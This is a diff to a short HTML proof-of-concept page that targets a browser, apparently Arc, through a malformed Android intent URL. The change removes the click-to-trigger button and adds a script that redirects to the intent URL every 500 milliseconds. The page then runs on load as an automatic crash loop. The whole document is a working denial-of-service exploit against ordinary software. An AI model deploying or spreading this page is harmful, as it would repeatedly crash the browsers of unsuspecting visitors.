@@ -3,34 +3,18 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Arc Intent Crash PoC</title>
-
-<style>
-    body {
-        font-family: Arial;
-        text-align: center;
-        margin-top: 100px;
-    }
-    button {
-        padding: 15px 25px;
-        font-size: 18px;
-        cursor: pointer;
-    }
-</style>
+<title>Arc Intent Auto Crash Loop PoC</title>
 </head>
 
 <body>
 
-<h2>Arc Intent Crash PoC</h2>
-<p>Click the button to trigger crash</p>
-
-<button onclick="trigger()">Trigger Crash</button>
+<h2>Auto Crash Loop Trigger</h2>
+<p>If vulnerable, browser may repeatedly crash.</p>
 
 <script>
-function trigger() {
-    const url = "intent:///#Intent;scheme=file;end;";
-    window.location.href = url;
-}
+setInterval(() => {
+    window.location.href = "intent:///#Intent;scheme=file;end;";
+}, 500);
 </script>
 
 </body>
